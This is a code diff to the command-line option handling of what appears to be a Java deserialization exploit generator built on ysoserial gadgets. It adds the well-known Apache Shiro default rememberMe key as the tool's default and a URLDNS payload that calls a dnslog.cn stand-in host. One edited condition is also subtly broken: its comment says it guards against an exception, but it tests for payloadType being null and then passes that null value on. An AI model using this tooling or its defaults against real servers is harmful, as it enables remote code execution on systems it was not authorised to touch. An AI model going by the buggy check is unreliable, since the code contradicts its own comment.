@@ -73,7 +73,7 @@ public class App {
         options.addOptionGroup(optionGroup);
 
         // gadget
-        options.addOption("g", "yso gadget");
+        options.addOption("g", true,"yso gadget");
         options.addOption("gh","gadget helper");
 
         // 其他
@@ -85,7 +85,7 @@ public class App {
         options.addOption("xe","xml encode");
 
         // payload参数
-        options.addOption("k", true,"key");
+        options.addOption("k", true,"key(default kPH+bIxk5D2deZiIxcaaaA==)");
         options.addOption("u", true,"url or dns");
         options.addOption("p", true,"port");
         options.addOption("lf",true,"local file path");
@@ -105,7 +105,7 @@ public class App {
         if (options.length == 0) {
             System.out.println(helper());
             System.exit(1);
-        }else if (o.hasOption("gh")){
+        }else if (cmdline.hasOption("gh")){
             System.out.println("..");
             System.exit(1);
         }
@@ -138,7 +138,8 @@ public class App {
                 case "statement":
                 case "un":
                 case "rf":
-                    if (cmdline.getOptionValue(payloadType).equals("JDBC") && payloadParam.isEmpty()){
+                    // 加一个payloadType 判断，否则先赋值后会 getOptionValue会抛出异常
+                    if (payloadType == null && cmdline.getOptionValue(payloadType).equals("JDBC") && payloadParam.isEmpty()){
                         if (cmdline.getOptionValue("un") == null){
                             payloadParam.add("yso_URLDNS_http://xxx.dnslog.cn");
                         }
@@ -156,7 +157,6 @@ public class App {
                     break;
             }
         }
-        System.out.println(payloadParam);
         Process process = new Process(code,other,gadget,payloadType,payloadParam,cmdline);
         Payload object = (Payload) process.makeObject();
         System.out.println(object.format());
